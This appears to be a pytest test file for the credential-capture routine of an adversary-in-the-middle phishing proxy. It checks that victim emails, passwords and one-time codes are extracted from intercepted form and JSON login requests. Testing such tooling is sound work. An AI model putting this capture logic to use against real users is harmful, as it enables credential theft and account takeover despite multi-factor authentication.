import pytest
from unittest.mock import MagicMock
from core.proxy.aitm import AiTMProxy
import json

class TestAiTMCapture:
    def setup_method(self):
        self.proxy = AiTMProxy()
        # Mock the session_manager within the proxy instance
        self.proxy.session_manager = MagicMock()

    def test_capture_form_credentials(self):
        session_id = "test_session_123"
        body = b"email=victim%40example.com&password=SecretPassword123"
        content_type = "application/x-www-form-urlencoded"

        self.proxy._capture_credentials(session_id, body, content_type)

        # Verify calls
        self.proxy.session_manager.capture_credential.assert_any_call(session_id, "email", "victim@example.com")
        self.proxy.session_manager.capture_credential.assert_any_call(session_id, "password", "SecretPassword123")

    def test_capture_json_credentials(self):
        session_id = "test_session_456"
        data = {
            "username": "victim@example.com",
            "password": "SecretPassword123",
            "otp_code": "123456"
        }
        body = json.dumps(data).encode("utf-8")
        content_type = "application/json"

        self.proxy._capture_credentials(session_id, body, content_type)

        # Verify calls
        self.proxy.session_manager.capture_credential.assert_any_call(session_id, "username", "victim@example.com")
        self.proxy.session_manager.capture_credential.assert_any_call(session_id, "password", "SecretPassword123")
        # "otp_code" matches "code" in sensitive_keys
        self.proxy.session_manager.capture_credential.assert_any_call(session_id, "otp_code", "123456")

    def test_capture_json_credentials_nested_ignored(self):
        # The current implementation only iterates top-level keys in JSON dict
        session_id = "test_session_789"
        data = {
            "meta": {
                "password": "HiddenPassword" 
            },
            "user": "victim@example.com"
        }
        body = json.dumps(data).encode("utf-8")
        content_type = "application/json"

        self.proxy._capture_credentials(session_id, body, content_type)

        # Verify calls
        self.proxy.session_manager.capture_credential.assert_any_call(session_id, "user", "victim@example.com")
        # Nested password should NOT be captured by current simple implementation
        # (This documents current limitation/behavior)
        # We check that it was NOT called with the nested password
        calls_args = [call.args for call in self.proxy.session_manager.capture_credential.call_args_list]
        captured_values = [args[2] for args in calls_args]
        assert "HiddenPassword" not in captured_values

    def test_capture_malformed_json(self):
        session_id = "test_session_err"
        body = b"{not valid json"
        content_type = "application/json"

        # Should not raise exception
        self.proxy._capture_credentials(session_id, body, content_type)
        
        self.proxy.session_manager.capture_credential.assert_not_called()
